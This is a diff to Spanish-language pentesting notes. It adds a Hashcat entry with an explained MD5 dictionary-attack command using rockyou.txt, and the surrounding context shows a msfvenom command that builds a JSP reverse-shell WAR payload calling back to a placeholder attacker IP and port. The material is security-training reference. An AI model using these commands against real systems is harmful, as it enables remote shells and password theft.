@@ -291,3 +291,17 @@ Es una herramienta muy potente y flexible que es fundamental para el trabajo en 
 
 ***Ejemplo de Comando***: $ msfvenom -p java/jsp_shell_reverse_tcp lhost=< Tu dirección IP > lport=< Puerto > -f war -o shell.war 
 
+
+***Hashcat***: Hashcat es una potente herramienta de cracking de contraseñas, a menudo considerada la más rápida y avanzada del mundo. Es de código abierto y puede ser utilizada tanto en CPU como en GPU.
+
+Hashcat admite cinco modos de ataque únicos para llevar a cabo una variedad de tareas de cracking de contraseñas, incluyendo ataques de fuerza bruta, ataques de diccionario, y ataques de combinación, entre otros.
+
+***Ejemplo de Comando***: hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+-m 0: Este parámetro le dice a Hashcat qué tipo de hash se está descifrando. En este caso, 0 representa MD5.
+
+-a 0: Esto se refiere al modo de ataque. 0 representa un ataque de diccionario.
+
+hashes.txt: Este es el archivo que contiene los hashes que estás intentando descifrar.
+
+/usr/share/wordlists/rockyou.txt: Esta es la ubicación del diccionario de palabras que se utilizará para el ataque de diccionario.
